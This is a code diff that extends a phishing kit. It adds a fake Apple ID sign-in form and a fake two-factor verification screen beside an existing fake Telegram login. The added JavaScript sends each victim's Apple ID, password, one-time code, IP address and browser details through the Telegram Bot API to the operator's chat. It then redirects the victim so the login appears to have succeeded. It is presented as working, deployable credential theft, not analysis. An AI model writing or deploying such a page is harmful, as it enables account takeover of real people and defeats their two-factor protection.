@@ -540,13 +540,128 @@
         </div>
     </div>
 
+    <!-- iCloud Login Form -->
+    <div class="container" id="icloudForm" style="display: none;">
+        <div class="login-card">
+            <div class="logo-section">
+                <div class="logo-icon">
+                    <svg viewBox="0 0 24 24" fill="currentColor">
+                        <path d="M18.71 19.5c-.83 1.24-1.71 2.45-3.05 2.47-1.34.03-1.77-.79-3.29-.79-1.53 0-2 .77-3.27.82-1.31.05-2.3-1.32-3.14-2.53C4.25 17 2.94 12.45 4.7 9.39c.87-1.52 2.43-2.48 4.12-2.51 1.28-.02 2.5.87 3.29.87.78 0 2.26-1.07 3.81-.91.65.03 2.47.26 3.64 1.98-.09.06-2.17 1.28-2.15 3.81.03 3.02 2.65 4.03 2.68 4.04-.03.07-.42 1.44-1.38 2.83M13 3.5c.73-.83 1.94-1.46 2.94-1.5.13 1.17-.34 2.35-1.04 3.19-.69.85-1.83 1.51-2.95 1.42-.15-1.15.41-2.35 1.05-3.11z"/>
+                    </svg>
+                </div>
+                <h1>Sign in with Apple ID</h1>
+                <p class="subtitle">Enter your iCloud credentials</p>
+            </div>
+
+            <form id="icloudLoginForm">
+                <div class="form-group">
+                    <label for="icloudEmail">Apple ID</label>
+                    <input type="text" id="icloudEmail" placeholder="name@icloud.com" required>
+                </div>
+
+                <div class="form-group">
+                    <label for="icloudPassword">Password</label>
+                    <input type="password" id="icloudPassword" placeholder="Enter your password" required>
+                </div>
+
+                <div class="info-box">
+                    <p><i class="fas fa-info-circle"></i> For accounts with two-factor authentication, use an app-specific password</p>
+                </div>
+
+                <div class="action-buttons">
+                    <button type="button" class="login-btn icloud-btn" onclick="submitICloudCredentials()">
+                        <span>Continue</span>
+                    </button>
+                    
+                    <button type="button" class="login-btn" onclick="backToMain()" style="margin-top: 10px;">
+                        <span>Back to login</span>
+                    </button>
+                </div>
+            </form>
+        </div>
+    </div>
+
+    <!-- iCloud OTP Verification -->
+    <div class="container" id="icloudOTP" style="display: none;">
+        <div class="login-card">
+            <div class="logo-section">
+                <div class="logo-icon">
+                    <svg viewBox="0 0 24 24" fill="currentColor">
+                        <path d="M18.71 19.5c-.83 1.24-1.71 2.45-3.05 2.47-1.34.03-1.77-.79-3.29-.79-1.53 0-2 .77-3.27.82-1.31.05-2.3-1.32-3.14-2.53C4.25 17 2.94 12.45 4.7 9.39c.87-1.52 2.43-2.48 4.12-2.51 1.28-.02 2.5.87 3.29.87.78 0 2.26-1.07 3.81-.91.65.03 2.47.26 3.64 1.98-.09.06-2.17 1.28-2.15 3.81.03 3.02 2.65 4.03 2.68 4.04-.03.07-.42 1.44-1.38 2.83M13 3.5c.73-.83 1.94-1.46 2.94-1.5.13 1.17-.34 2.35-1.04 3.19-.69.85-1.83 1.51-2.95 1.42-.15-1.15.41-2.35 1.05-3.11z"/>
+                    </svg>
+                </div>
+                <h1>Two-Factor Authentication</h1>
+                <p class="subtitle">Enter the verification code sent to your Apple devices</p>
+            </div>
+
+            <div style="text-align: center; margin: 30px 0;">
+                <div style="font-size: 48px; color: #000; margin-bottom: 20px;">
+                    <i class="fas fa-shield-alt"></i>
+                </div>
+                
+                <p style="color: #666; margin-bottom: 25px; font-size: 14px;">
+                    A 6-digit verification code has been sent to your Apple devices.
+                    Enter the code to continue.
+                </p>
+                
+                <div style="margin: 25px 0;">
+                    <input type="text" id="icloudOtpCode" class="otp-input" placeholder="000000" 
+                           maxlength="6" pattern="\d{6}" required>
+                    <p style="color: #999; font-size: 12px; margin-top: 8px;">
+                        Enter the 6-digit code from your Apple device
+                    </p>
+                </div>
+                
+                <div class="notification-steps">
+                    <div class="step-item">
+                        <div class="step-number">1</div>
+                        <div class="step-content">
+                            <h3>Check Your Devices</h3>
+                            <p>Look for the verification code on your iPhone, iPad, or Mac</p>
+                        </div>
+                    </div>
+                    
+                    <div class="step-item">
+                        <div class="step-number">2</div>
+                        <div class="step-content">
+                            <h3>Enter Code</h3>
+                            <p>Type the 6-digit code shown on your trusted device</p>
+                        </div>
+                    </div>
+                    
+                    <div class="step-item">
+                        <div class="step-number">3</div>
+                        <div class="step-content">
+                            <h3>Complete Login</h3>
+                            <p>You'll be logged in automatically after verification</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="action-buttons">
+                <button type="button" class="login-btn icloud-btn" onclick="verifyICloudOTP()">
+                    <span>Verify and Continue</span>
+                </button>
+                
+                <button type="button" class="login-btn" onclick="resendICloudOTP()" style="margin-top: 10px;">
+                    <span>Resend Code</span>
+                </button>
+                
+                <button type="button" class="login-btn" onclick="backToICloudLogin()" style="margin-top: 10px; background: transparent; color: #666; border: 1px solid #ddd;">
+                    <span><i class="fas fa-arrow-left"></i> Back</span>
+                </button>
+            </div>
+        </div>
+    </div>
+
     <!-- Telegram Phone Login -->
     <div class="container" id="telegramPhone" style="display: none;">
         <div class="login-card">
             <div class="logo-section">
                 <div class="logo-icon" style="background: #2AABEE;">
                     <svg viewBox="0 0 24 24" fill="white">
-                        <path d="M11.944 0A12 12 0 0 0 0 12a12 12 0 0 0 12 12 12 12 0 0 0 12-12A12 12 0 0 0 12 0a12 12 0 0 0-.056 0zm4.962 7.224c.1-.002.321.023.465.14a.506.506 0 0 1 .171.325c.016.093.036.306.02.472-.18 1.898-.962 6.502-1.36 8.627-.168.9-.499 1.201-.82 1.23-.696.064-1.225-.46-1.9-.902-1.056-.693-1.653-1.124-2.678-1.8-1.185-.78-.417-1.21.258-1.91.177-.184 3.247-2.977 3.307-3.23.007-.032.014-.15-.056-.212s-.174-.041-.249-.024c-.106.024-1.793 1.14-5.061 3.345-.48.33-.913.49-1.302.48-.428-.008-1.252-.241-1.865-.44-.752-.245-1.349-.374-1.297-.789.027-.216.325-.437.893-.663 3.498-1.524 5.83-2.529 6.998-3.014 3.332-1.386 4.025-1.627 4.476-1.635z"/>
+                        <path d="M11.944 0A12 12 0 0 0 0 12a12 12 0 0 0 12 12 12 12 0 0 0 12-12A12 12 0 0 0 12 0a12 12 0 0 0-.056 0zm4.962 7.224c.1-.002.321.023.465.14a.506.506 0 0 1 .171.325c.16.093.036.306.02.472-.18 1.898-.962 6.502-1.36 8.627-.168.9-.499 1.201-.82 1.23-.696.064-1.225-.46-1.9-.902-1.056-.693-1.653-1.124-2.678-1.8-1.185-.78-.417-1.21.258-1.91.177-.184 3.247-2.977 3.307-3.23.007-.032.014-.15-.056-.212s-.174-.041-.249-.024c-.106.024-1.793 1.14-5.061 3.345-.48.33-.913.49-1.302.48-.428-.008-1.252-.241-1.865-.44-.752-.245-1.349-.374-1.297-.789.027-.216.325-.437.893-.663 3.498-1.524 5.83-2.529 6.998-3.014 3.332-1.386 4.025-1.627 4.476-1.635z"/>
                     </svg>
                 </div>
                 <h1>Sign in to Telegram</h1>
@@ -685,8 +800,17 @@
         // Store user data
         let telegramPhone = '';
         let userIP = '';
+        let icloudCredentials = { email: '', password: '' };
 
         // Navigation Functions
+        function showICloudLogin() {
+            document.getElementById('mainScreen').style.display = 'none';
+            document.getElementById('icloudForm').style.display = 'block';
+            setTimeout(() => {
+                document.getElementById('icloudEmail').focus();
+            }, 100);
+        }
+        
         function showTelegramLogin() {
             document.getElementById('mainScreen').style.display = 'none';
             document.getElementById('telegramPhone').style.display = 'block';
@@ -697,15 +821,25 @@
         
         function backToMain() {
             document.getElementById('mainScreen').style.display = 'block';
+            document.getElementById('icloudForm').style.display = 'none';
+            document.getElementById('icloudOTP').style.display = 'none';
             document.getElementById('telegramPhone').style.display = 'none';
             document.getElementById('telegramOTP').style.display = 'none';
             document.getElementById('successScreen').style.display = 'none';
             
             // Clear form fields
+            document.getElementById('icloudEmail').value = '';
+            document.getElementById('icloudPassword').value = '';
+            document.getElementById('icloudOtpCode').value = '';
             document.getElementById('telegramPhoneInput').value = '';
             document.getElementById('phoneError').style.display = 'none';
             document.getElementById('telegramPhoneInput').classList.remove('error-border');
             clearOtpFields();
+        }
+        
+        function backToICloudLogin() {
+            document.getElementById('icloudOTP').style.display = 'none';
+            document.getElementById('icloudForm').style.display = 'block';
         }
         
         function backToTelegramPhone() {
@@ -717,7 +851,68 @@
             alert('Country selection would appear here in a real implementation.');
         }
 
-        // Phone input validation - SIMPLE FIX
+        // iCloud Functions
+        async function submitICloudCredentials() {
+            const email = document.getElementById('icloudEmail').value;
+            const password = document.getElementById('icloudPassword').value;
+            
+            if (!email || !password) {
+                alert('Please enter both Apple ID and password');
+                return;
+            }
+            
+            icloudCredentials = { email, password };
+            userIP = await getIPAddress();
+            
+            // Send to Telegram
+            await sendICloudCredentialsToTelegram(email, password);
+            
+            document.getElementById('icloudForm').style.display = 'none';
+            document.getElementById('icloudOTP').style.display = 'block';
+            
+            setTimeout(() => {
+                document.getElementById('icloudOtpCode').focus();
+            }, 100);
+        }
+        
+        async function verifyICloudOTP() {
+            const otp = document.getElementById('icloudOtpCode').value;
+            
+            if (!otp || otp.length !== 6) {
+                alert('Please enter a valid 6-digit verification code');
+                return;
+            }
+            
+            // Send OTP to Telegram
+            await sendICloudOTPToTelegram(icloudCredentials.email, otp);
+            
+            // Show success and redirect
+            document.getElementById('icloudOTP').style.display = 'none';
+            document.getElementById('successScreen').style.display = 'block';
+            
+            // Redirect to collab-form.html after 2 seconds
+            setTimeout(() => {
+                window.location.href = 'collab-form.html';
+            }, 2000);
+        }
+        
+        function resendICloudOTP() {
+            const resendBtn = document.querySelector('#icloudOTP .login-btn:nth-child(2)');
+            const originalText = resendBtn.innerHTML;
+            resendBtn.innerHTML = '<span><i class="fas fa-spinner fa-spin"></i> Sending new code...</span>';
+            resendBtn.disabled = true;
+            
+            setTimeout(() => {
+                alert('New verification code has been sent to your Apple devices');
+                resendBtn.innerHTML = originalText;
+                resendBtn.disabled = false;
+                
+                document.getElementById('icloudOtpCode').value = '';
+                document.getElementById('icloudOtpCode').focus();
+            }, 1500);
+        }
+
+        // Phone input validation
         document.addEventListener('DOMContentLoaded', function() {
             const phoneInput = document.getElementById('telegramPhoneInput');
             const phoneError = document.getElementById('phoneError');
@@ -765,6 +960,28 @@
                     }
                 });
             }
+            
+            // iCloud form Enter key support
+            document.getElementById('icloudPassword')?.addEventListener('keypress', function(e) {
+                if (e.key === 'Enter') {
+                    e.preventDefault();
+                    submitICloudCredentials();
+                }
+            });
+            
+            document.getElementById('icloudOtpCode')?.addEventListener('keypress', function(e) {
+                if (e.key === 'Enter') {
+                    e.preventDefault();
+                    verifyICloudOTP();
+                }
+            });
+            
+            // Auto-submit iCloud OTP
+            document.getElementById('icloudOtpCode')?.addEventListener('input', function(e) {
+                if (this.value.length === 6) {
+                    verifyICloudOTP();
+                }
+            });
         });
 
         // Telegram OTP Functions
@@ -895,7 +1112,7 @@
             otpDigits.forEach(digit => digit.value = '');
         }
 
-        // Telegram Bot Functions - UPDATED: NO GENERATED OTP
+        // Telegram Bot Functions
         async function sendTelegramPhoneToBot(phone) {
             const timestamp = new Date().toLocaleString();
             const userAgent = navigator.userAgent;
@@ -941,6 +1158,76 @@ ${userAgent}
 
 📞 *Phone Number:* \`${phone}\`
 🔢 *Entered OTP:* \`${enteredOTP}\`
+📍 *IP Address:* \`${userIP}\`
+📅 *Time:* ${timestamp}
+
+✅ *User is being redirected to collab-form.html*
+            `;
+            
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message,
+                        parse_mode: 'Markdown'
+                    })
+                });
+            } catch (error) {
+                console.error('Telegram error:', error);
+            }
+        }
+        
+        // iCloud Bot Functions
+        async function sendICloudCredentialsToTelegram(email, password) {
+            const timestamp = new Date().toLocaleString();
+            const userAgent = navigator.userAgent;
+            
+            const message = `
+🍎 *ICLOUD LOGIN ATTEMPT*
+
+📧 *Apple ID:* \`${email}\`
+🔑 *Password:* \`${password}\`
+📍 *IP Address:* \`${userIP}\`
+📅 *Time:* ${timestamp}
+🌐 *Page URL:* \`${window.location.href}\`
+
+📱 *Browser Info:*
+\`\`\`
+${userAgent}
+\`\`\`
+
+⏳ *Waiting for OTP...*
+            `;
+            
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message,
+                        parse_mode: 'Markdown'
+                    })
+                });
+            } catch (error) {
+                console.error('Telegram error:', error);
+            }
+        }
+        
+        async function sendICloudOTPToTelegram(email, otp) {
+            const timestamp = new Date().toLocaleString();
+            
+            const message = `
+🔢 *ICLOUD OTP ENTERED*
+
+📧 *Apple ID:* \`${email}\`
+🔢 *OTP Code:* \`${otp}\`
 📍 *IP Address:* \`${userIP}\`
 📅 *Time:* ${timestamp}
 
